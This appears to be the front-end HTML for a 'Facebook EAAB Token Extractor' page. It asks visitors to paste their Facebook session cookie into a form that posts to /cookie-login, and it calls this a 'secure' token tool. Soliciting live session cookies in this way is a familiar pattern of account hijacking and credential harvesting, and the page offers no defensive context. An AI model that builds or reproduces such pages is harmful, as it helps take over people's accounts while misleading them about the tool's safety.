<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Facebook EAAB Token Extractor</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #1e1e1e;
            color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            height: 100vh;
            align-items: center;
            justify-content: center;
        }

        .container {
            background: #2b2b2b;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            max-width: 600px;
            width: 100%;
        }

        h2 {
            margin-top: 0;
            color: #ff0033;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 15px;
            text-align: center;
        }

        p.description {
            color: #ccc;
            font-size: 15px;
            text-align: center;
            margin-bottom: 30px;
        }

        textarea {
            width: 100%;
            padding: 12px;
            font-size: 15px;
            border-radius: 8px;
            border: 1px solid #444;
            background-color: #1e1e1e;
            color: #fff;
            resize: vertical;
            margin-bottom: 20px;
            box-sizing: border-box;
        }

        textarea::placeholder {
            color: #888;
        }

        button {
            width: 100%;
            background-color: #ff0033;
            color: white;
            padding: 14px;
            font-size: 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background-color: #e6002c;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
            color: #888;
        }

        @media (max-width: 600px) {
            .container {
                margin: 20px;
                padding: 25px 20px;
            }

            h2 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>EAAB Token Extractor</h2>
        <p class="description">Enter your Facebook cookie to extract the EAAB access token securely.</p>

        <form method="POST" action="/cookie-login">
            <textarea name="cookie" rows="5" placeholder="Paste your Facebook cookie here..." required></textarea>
            <button type="submit">Extract Token</button>
        </form>

        <div class="footer">
            &copy; 2025 â€¢ Secure Token Tool by DevOps
        </div>
    </div>
</body>
</html>
